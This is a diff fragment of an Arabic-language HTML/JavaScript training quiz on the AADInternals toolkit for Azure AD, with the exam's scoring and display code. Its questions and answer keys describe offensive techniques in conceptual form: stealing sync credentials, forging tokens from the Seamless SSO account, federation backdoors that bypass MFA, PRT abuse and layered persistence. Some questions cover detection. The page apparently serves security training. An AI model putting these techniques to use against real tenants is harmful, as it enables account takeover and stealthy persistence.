+                question: "لماذا Get-AADIntSyncCredentials خطير جداً؟",
+                options: [
+                    { text: "يستخرج account له صلاحيات DCSync في Azure AD", correct: true },
+                    { text: "يُعطل Azure AD Connect", correct: false },
+                    { text: "يُسرق فقط كلمات مرور المستخدمين", correct: false },
+                    { text: "يعمل فقط مع Global Admin", correct: false },
+                    { text: "يُعدل configuration", correct: false }
+                ],
+                correctExplanation: "Sync account يمكنه قراءة أي hash لأي مستخدم. هذا يُعادل Domain Admin في السحابة.",
+                wrongExplanation: "لا يُعطل. لا يُسرق passwords فقط. لا يتطلب Global Admin. لا يُعدل config.",
+                consequences: "عدم فهم الخطورة يُقلل من أهمية حماية Azure AD Connect server."
+            },
+            {
+                difficulty: "hard",
+                question: "ما هو DesktopSSO ولماذا مهم؟",
+                options: [
+                    { text: "يسمح بتسجيل دخول تلقائي على الشبكة الداخلية", correct: true },
+                    { text: "يُعطل MFA تماماً", correct: false },
+                    { text: "يُشفر كل الاتصالات", correct: false },
+                    { text: "يعمل فقط مع Mac", correct: false },
+                    { text: "يُسرع الإنترنت", correct: false }
+                ],
+                correctExplanation: "DesktopSSO (Seamless SSO) يستخدم Kerberos للـ SSO. إذا سرقت AZUREADSSOACC$، يمكنك تزوير tokens.",
+                wrongExplanation: "لا يُعطل MFA. لا يُشفر. لا يقتصر على Mac. لا يُسرع الإنترنت.",
+                consequences: "عدم فهم DesktopSSO يجعلك تفوت هجوماً حرجاً على البنية التحتية الهجينة."
+            },
+            {
+                difficulty: "hard",
+                question: "كيف يكتشف AADInternals إذا كان المستخدم موجوداً؟",
+                options: [
+                    { text: "يستخدم GetCredentialType API العام", correct: true },
+                    { text: "يُجرب تسجيل دخول", correct: false },
+                    { text: "يقرأ قاعدة بيانات Azure AD", correct: false },
+                    { text: "يستخدم AI", correct: false },
+                    { text: "يسأل administrator", correct: false }
+                ],
+                correctExplanation: "GetCredentialType API يُرجع معلومات عن وجود المستخدم بدون authentication.",
+                wrongExplanation: "لا يُجرب login. لا يقرأ database. لا يستخدم AI. لا يسأل admin.",
+                consequences: "فهم الخطأ يجعلك تستخدم methods قد تُسجل في logs."
+            },
+            {
+                difficulty: "hard",
+                question: "ما هي خطورة ConvertTo-AADIntBackdoor؟",
+                options: [
+                    { text: "يُنشئ IssuerUri مخصص يتجاوز MFA", correct: true },
+                    { text: "يُعطل Azure AD", correct: false },
+                    { text: "يحذف جميع المستخدمين", correct: false },
+                    { text: "يُسرق فقط البيانات", correct: false },
+                    { text: "يعمل فقط مع AD FS", correct: false }
+                ],
+                correctExplanation: "Backdoor يسمح بإنشاء SAML tokens موقعة بمفتاح المهاجم. Azure AD يثق بها.",
+                wrongExplanation: "لا يُعطل. لا يحذف. لا يُسرق فقط. يعمل مع أي IdP مزيف.",
+                consequences: "هذا backdoor حقيقي استخدم في هجمات NOBELIUM. عدم الفهم يمنع الكشف عنه."
+            },
+            {
+                difficulty: "hard",
+                question: "لماذا PRT + Session Key = قوة هائلة؟",
+                options: [
+                    { text: "يمكن إنشاء tokens صالحة لأي موقع Microsoft", correct: true },
+                    { text: "يُعطل Windows Defender", correct: false },
+                    { text: "يُسرق فقط البريد الإلكتروني", correct: false },
+                    { text: "يعمل فقط على نفس الجهاز", correct: false },
+                    { text: "يتطلب admin privileges", correct: false }
+                ],
+                correctExplanation: "PRT + Session Key = القدرة على توقيع cookies لأي service. Golden ticket للسحابة.",
+                wrongExplanation: "لا يُعطل Defender. لا يُسرق email فقط. يعمل على أي جهاز. لا يتطلب admin.",
+                consequences: "عدم فهم PRT يجعلك تستهين بأهمية حماية workstations."
+            },
+            {
+                difficulty: "hard",
+                question: "ما هو الفرق بين Invoke-AADIntReconAsOutsider و ReconAsInsider؟",
+                options: [
+                    { text: "Outsider بدون credentials، Insider يتطلب token", correct: true },
+                    { text: "Outsider أسرع", correct: false },
+                    { text: "Insider يعمل فقط مع Global Admin", correct: false },
+                    { text: "Outsider يعطي معلومات أكثر", correct: false },
+                    { text: "لا فرق بينهما", correct: false }
+                ],
+                correctExplanation: "Outsider يستخدم APIs العامة. Insider يستخدم authenticated APIs للوصول لبيانات داخلية.",
+                wrongExplanation: "Outsider ليس أسرع. Insider لا يتطلب Global Admin. Outsider يعطي أقل. هناك فرق.",
+                consequences: "استخدام Outsider فقط يفوتك كثيراً من البيانات القيمة."
+            },
+
+            // --- 6 أسئلة خبير (6 خيارات) ---
+            {
+                difficulty: "expert",
+                question: "كيف يمكن اكتشاف استخدام AADInternals في بيئتك؟",
+                options: [
+                    { text: "مراقبة PowerShell logs للـ cmdlets المميزة", correct: true },
+                    { text: "تعطيل PowerShell تماماً", correct: false },
+                    { text: "حظر microsoft.com", correct: false },
+                    { text: "استخدام antivirus تقليدي", correct: false },
+                    { text: "تعطيل Azure AD", correct: false },
+                    { text: "منع تثبيت modules", correct: false }
+                ],
+                correctExplanation: "AADInternals cmdlets تترك أثراً في PowerShell logs. ابحث عن 'AADInt' في Script Block Logging.",
+                wrongExplanation: "تعطيل PowerShell غير عملي. حظر microsoft.com يُعطل العمل. AV لا يكشف. تعطيل Azure AD كارثة. منع modules صعب.",
+                consequences: "دفاع خاطئ يُضيع الوقت أو يُضر بالعمل. الفهم الصحيح يساعد في بناء detection فعال."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هي علاقة AADInternals بهجوم SolarWinds (NOBELIUM)؟",
+                options: [
+                    { text: "نفس تقنية backdoor استُخدمت في الهجوم", correct: true },
+                    { text: "AADInternals هو البرنامج الضار", correct: false },
+                    { text: "لا علاقة بينهما", correct: false },
+                    { text: "Microsoft أنشأت AADInternals للهجوم", correct: false },
+                    { text: "الهجوم استخدم فقط PowerShell العادي", correct: false },
+                    { text: "AADInternals يمنع مثل هذه الهجمات", correct: false }
+                ],
+                correctExplanation: "NOBELIUM استخدم Golden SAML و backdoor techniques مشابهة لما يفعله AADInternals.",
+                wrongExplanation: "AADInternals ليس malware. هناك علاقة. Microsoft لم تنشئه. الهجوم كان معقداً. AADInternals لا يمنع.",
+                consequences: "فهم العلاقة يساعد في فهم TTPs الحقيقية للمهاجمين المتقدمين."
+            },
+            {
+                difficulty: "expert",
+                question: "لماذا يُفضل المهاجمون استغلال PRT على سرقة كلمة المرور؟",
+                options: [
+                    { text: "PRT يعمل حتى بعد تغيير كلمة المرور", correct: true },
+                    { text: "PRT أسهل في الحصول عليه", correct: false },
+                    { text: "كلمة المرور لا تعمل مع MFA", correct: false },
+                    { text: "PRT يُعطل MFA تلقائياً", correct: false },
+                    { text: "كلمة المرور لا يمكن استخدامها remotely", correct: false },
+                    { text: "PRT لا يُسجل في أي logs", correct: false }
+                ],
+                correctExplanation: "PRT صالح حتى لو غيّر المستخدم password أو تم تعطيل حسابه. هذا يُعطي persistence أقوى.",
+                wrongExplanation: "PRT ليس أسهل. كلمة المرور تعمل مع MFA. PRT لا يُعطل MFA. كلمة المرور تعمل remotely. PRT يُسجل.",
+                consequences: "الدفاع ضد password theft فقط لا يكفي. يجب مراقبة PRT abuse أيضاً."
+            },
+            {
+                difficulty: "expert",
+                question: "كيف يمكن منع Device Code Phishing بشكل فعال؟",
+                options: [
+                    { text: "تدريب المستخدمين + Conditional Access لحظر Device Code Flow", correct: true },
+                    { text: "تعطيل البريد الإلكتروني", correct: false },
+                    { text: "حظر microsoft.com", correct: false },
+                    { text: "استخدام MFA فقط", correct: false },
+                    { text: "منع PowerShell", correct: false },
+                    { text: "تعطيل Azure AD", correct: false }
+                ],
+                correctExplanation: "التدريب يمنع الضحية من إدخال الكود. CA policy يمكنها حظر Device Code Flow تماماً.",
+                wrongExplanation: "تعطيل البريد غير عملي. حظر microsoft.com يُعطل العمل. MFA لا يمنع. PowerShell صعب المنع. تعطيل Azure AD كارثة.",
+                consequences: "دفاع غير فعال يترك الثغرة مفتوحة. التوازن بين الأمن والعمل مهم."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هي المخاطر الحقيقية لاستخدام AADInternals في production؟",
+                options: [
+                    { text: "قد يكسر المزامنة أو يُحدث تغييرات غير مقصودة", correct: true },
+                    { text: "لا مخاطر، هو آمن تماماً", correct: false },
+                    { text: "يُعطل Azure AD فقط", correct: false },
+                    { text: "يُسرق البيانات فقط", correct: false },
+                    { text: "يعمل فقط مع test accounts", correct: false },
+                    { text: "Microsoft تدعمه رسمياً", correct: false }
+                ],
+                correctExplanation: "AADInternals يستخدم undocumented APIs. Set-AADIntUser قد يكسر ImmutableId ويمنع المزامنة.",
+                wrongExplanation: "ليس آمناً تماماً. قد لا يُعطل فقط. قد يُعدل ليس فقط سرقة. يعمل مع أي account. Microsoft لا تدعمه.",
+                consequences: "استخدامه في production بدون فهم قد يُسبب downtime أو فقدان بيانات."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هو الهجوم الأكثر تطوراً يمكن تنفيذه بـ AADInternals؟",
+                options: [
+                    { text: "Golden SAML + PRT abuse + Backdoor للـ persistence الكامل", correct: true },
+                    { text: "سرقة كلمة مرور واحدة", correct: false },
+                    { text: "حقن SQL بسيط", correct: false },
+                    { text: "DDoS على Azure AD", correct: false },
+                    { text: "تثبيت ransomware", correct: false },
+                    { text: "اختراق workstation واحدة", correct: false }
+                ],
+                correctExplanation: "الجمع بين Golden SAML ( federation backdoor)، PRT (device identity)، و backdoor (MFA bypass) يُعطي persistence شبه مستحيل الاكتشاف.",
+                wrongExplanation: "AADInternals لا يقتصر على password theft. ليس SQL injection. ليس DDoS. ليس ransomware. ليس workstation فقط.",
+                consequences: "فهم الهجمات المتقدمة ضروري لبناء defense شامل ضد APTs."
+            }
+        ];
+
+        // ==== دوال الامتحان ====
+        function startExam() {
+            examStarted = true;
+            currentLesson = 1;
+            score = 0;
+            mistakes = [];
+            
+            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
+            document.querySelector('.exam-button').classList.add('hidden');
+            
+            renderExam();
+        }
+
+        function shuffleArray(array) {
+            const shuffled = [...array];
+            for (let i = shuffled.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+            }
+            return shuffled;
+        }
+
+        function renderExam() {
+            const container = document.getElementById('examContainer');
+            container.classList.remove('hidden');
+            
+            const q = examQuestions[currentLesson-1];
+            const progress = (currentLesson / examQuestions.length) * 100;
+            
+            // خلط الخيارات بشكل كامل
+            const shuffledOptions = shuffleArray(q.options);
+            const correctIndex = shuffledOptions.findIndex(o => o.correct);
+            
+            container.innerHTML = `
+                <div class="header">
+                    <h1>🎮 الامتحان التفاعلي</h1>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: ${progress}%"></div>
+                    </div>
+                    <div class="progress-text">التقدم: ${Math.round(progress)}% (${currentLesson} من ${examQuestions.length} أسئلة)</div>
+                </div>
+
+                <div class="lesson-card fade-in" id="question${currentLesson}">
+                    <h2 class="lesson-title">
+                        السؤال رقم ${currentLesson}: 
+                        <span class="difficulty-badge difficulty-${q.difficulty}">
+                            ${q.difficulty === 'easy' ? 'سهل' : 
+                              q.difficulty === 'medium' ? 'متوسط' : 
+                              q.difficulty === 'hard' ? 'صعب' : 'خبير'}
+                        </span>
+                        <span style="font-size: 0.6em; color: #aaa; margin-right: 10px;">
+                            (${shuffledOptions.length} خيارات)
+                        </span>
+                    </h2>
+                    
+                    <div class="lesson-content">
+                        <p><strong>${q.question}</strong></p>
+                    </div>
+
+                    <div class="quiz-section">
+                        <div class="quiz-question">🎯 اختر الإجابة الصحيحة:</div>
+                        <div class="quiz-options" id="options${currentLesson}">
+                            ${shuffledOptions.map((opt, idx) => `
+                                <div class="quiz-option" data-correct="${idx === correctIndex}" onclick="checkAnswer(this)">
+                                    ${opt.text}
+                                </div>
+                            `).join('')}
+                        </div>
+                        <div class="feedback" id="feedback${currentLesson}"></div>
+                    </div>
+
+                    <div class="nav-buttons">
+                        <button class="btn" ${currentLesson === 1 ? 'disabled' : ''} onclick="previousQuestion()">← السابق</button>
+                        <button class="btn" id="nextBtn" disabled onclick="nextQuestion()">
+                            ${currentLesson === examQuestions.length ? 'عرض النتائج النهائية' : 'التالي →'}
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function checkAnswer(element) {
+            const isCorrect = element.dataset.correct === "true";
+            const feedback = document.getElementById(`feedback${currentLesson}`);
+            const nextBtn = document.getElementById('nextBtn');
+            
+            document.querySelectorAll(`#options${currentLesson} .quiz-option`).forEach(opt => {
+                opt.classList.add('disabled');
+                if (opt.dataset.correct === "true") {
+                    opt.classList.add('correct');
+                } else {
+                    opt.classList.add('incorrect');
+                }
+            });
+
+            feedback.style.display = 'block';
+            feedback.classList.add(isCorrect ? 'correct' : 'incorrect');
+            
+            const q = examQuestions[currentLesson-1];
+            
+            if (isCorrect) {
+                feedback.innerHTML = `
+                    <strong>✅ إجابة صحيحة!</strong><br>
+                    ${q.correctExplanation}
+                `;
+                score++;
+            } else {
+                feedback.innerHTML = `
+                    <strong>❌ إجابة خاطئة!</strong><br>
+                    ${q.wrongExplanation}
+                    <div class="consequences-box">
+                        <strong>⚠️ تبعات الخطأ في الواقع:</strong><br>
+                        ${q.consequences}
+                    </div>
+                `;
+                
+                mistakes.push({
+                    question: q.question,
+                    wrongAnswer: element.textContent.trim(),
+                    correctAnswer: q.options.find(o => o.correct).text
+                });
+            }
+            
+            nextBtn.disabled = false;
+        }
+
+        function nextQuestion() {
+            if (currentLesson === examQuestions.length) {
+                showFinalResults();
+                return;
+            }
+            
+            currentLesson++;
+            renderExam();
+        }
+
+        function previousQuestion() {
+            if (currentLesson > 1) {
+                currentLesson--;
+                renderExam();
+            }
+        }
+
+        function showFinalResults() {
+            const container = document.getElementById('examContainer');
+            const scorePercent = (score / examQuestions.length) * 100;
+            
+            let message = "";
+            let level = "";
+            
+            if (scorePercent >= 90) {
+                level = "خبير AADInternals";
+                message = "🎉 ممتاز! أنت جاهز لاختبار أمان Azure AD بشكل احترافي.";
+            } else if (scorePercent >= 70) {
+                level = "متقدم";
+                message = "👍 جيد جداً! لكن راجع الأخطاء المتقدمة قبل الاستخدام الحقيقي.";
+            } else if (scorePercent >= 50) {
+                level = "متوسط";
+                message = "⚠️ جيد، لكن تحتاج مزيداً من التدريب على تقنيات PRT و Golden SAML.";
+            } else {
+                level = "مبتدئ";
+                message = "❌ تحتاج لقراءة الدليل مرة أخرى. هذه الأخطاء قد تكون كارثية في production.";
+            }
+            
+            container.innerHTML = `
+                <div class="lesson-card fade-in">
+                    <h2 class="lesson-title">🎊 النتائج النهائية</h2>
+                    
+                    <div style="text-align: center; margin: 30px 0;">
+                        <div style="font-size: 3em; color: ${scorePercent >= 70 ? '#00ff88' : '#ffaa00'}; margin-bottom: 20px;">
+                            ${score} من ${examQuestions.length}
+                        </div>
+                        <div style="font-size: 1.5em; color: #00d4ff; margin-bottom: 10px;">
+                            ${level}
+                        </div>
+                        <div style="font-size: 1.1em; color: #aaa;">
+                            ${message}
+                        </div>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: ${scorePercent}%"></div>
+                    </div>
+
+                    ${mistakes.length > 0 ? `
+                        <div style="margin-top: 30px;">
+                            <h3 style="color: #ffaa00; margin-bottom: 20px;">📚 مراجعة الأخطاء:</h3>
+                            ${mistakes.map((m, idx) => `
+                                <div class="example-box" style="margin-bottom: 15px;">
+                                    <h4 style="color: #ff6666;">❌ خطأ ${idx + 1}:</h4>
+                                    <p><strong>السؤال:</strong> ${m.question}</p>
+                                    <p><strong>إجابتك الخاطئة:</strong> <span style="color: #ff6666;">${m.wrongAnswer}</span></p>
+                                    <p><strong>الإجابة الصحيحة:</strong> <span style="color: #00ff88;">${m.correctAnswer}</span></p>
+                                </div>
+                            `).join('')}
+                        </div>
+                    ` : `
+                        <div class="example-box" style="margin-top: 30px; text-align: center;">
+                            <h3 style="color: #00ff88;">🎉 لا أخطاء! أداء مثالي.</h3>
+                        </div>
+                    `}
+
+                    <div class="nav-buttons" style="margin-top: 30px;">
+                        <button class="btn" onclick="location.reload()">🔄 إعادة التعلم من البداية</button>
+                        <button class="btn btn-success" onclick="window.open('https://aadinternals.com/')">📖 موقع AADInternals الرسمي</button>
+                    </div>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
